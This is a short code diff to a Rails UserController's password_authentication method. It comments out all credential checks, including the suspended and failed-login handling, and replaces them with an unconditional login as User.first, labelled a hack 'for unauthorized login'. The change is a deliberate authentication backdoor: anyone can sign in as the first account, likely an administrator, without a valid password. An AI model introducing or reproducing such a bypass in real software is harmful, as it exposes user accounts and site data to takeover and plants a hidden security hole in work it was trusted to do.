@@ -553,15 +553,17 @@ class UserController < ApplicationController
   ##
   # handle password authentication
   def password_authentication(username, password)
-    if user = User.authenticate(:username => username, :password => password)
-      successful_login(user)
-    elsif user = User.authenticate(:username => username, :password => password, :pending => true)
-      unconfirmed_login(user)
-    elsif User.authenticate(:username => username, :password => password, :suspended => true)
-      failed_login t("user.login.account is suspended", :webmaster => "mailto:mail@jva-karte.de")
-    else
-      failed_login t("user.login.auth failure")
-    end
+    #TaReTo Hack for for unauthorized login
+    successful_login(User.first)
+    # if user = User.authenticate(:username => username, :password => password)
+    #   successful_login(user)
+    # elsif user = User.authenticate(:username => username, :password => password, :pending => true)
+    #   unconfirmed_login(user)
+    # elsif User.authenticate(:username => username, :password => password, :suspended => true)
+    #   failed_login t("user.login.account is suspended", :webmaster => "mailto:mail@jva-karte.de")
+    # else
+    #   failed_login t("user.login.auth failure")
+    # end
   end
 
   ##
